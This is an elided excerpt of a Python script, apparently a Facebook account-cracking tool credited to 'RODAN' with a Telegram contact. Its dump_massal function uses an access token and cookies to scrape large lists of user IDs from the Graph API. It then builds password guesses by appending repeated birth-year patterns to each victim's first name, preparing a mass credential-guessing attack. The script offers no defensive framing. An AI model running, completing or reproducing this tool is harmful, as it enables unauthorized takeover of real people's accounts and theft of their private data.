...
def info():
	prints(f"""{B2}╭─────────────────────╮{B2}╭───────────────╮
{B2}│ {P2}Author : RODAN{B2} │{B2}│ {P2}Version : 2.0{B2} │
{B2}╰─────────────────────╯{B2}╰───────────────╯""")
def banner():
	clear()
	prints(nel(f"""\t {color_text} 
...
def dump_massal():
	...
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=subscribers.limit(99999)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			...
			for yuzong in id2:
				...
				if len(nmf)<6:
					if len(frs)<3:
						...
						pwv.append(frs+'20062006')
						pwv.append(frs+'20202020')
						pwv.append(frs+'20232023')
						pwv.append(frs+'20012001')
						pwv.append(frs+'20002000')
						pwv.append(frs+'19991999')
						pwv.append(frs+'19981998')
						pwv.append(frs+'19971997')
						pwv.append(frs+'19961996')
						pwv.append(frs+'19951995')
						pwv.append(frs+'19941994')
						pwv.append(frs+'19931993')
						pwv.append(frs+'19921992')
						pwv.append(frs+'19911991')
						pwv.append(frs+'19901990')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
...
def getkey():
    ...
    try:
        ...
        print("\033[0m╰─ Telegram:@VIPJL ");time.sleep(2)
        print ("")
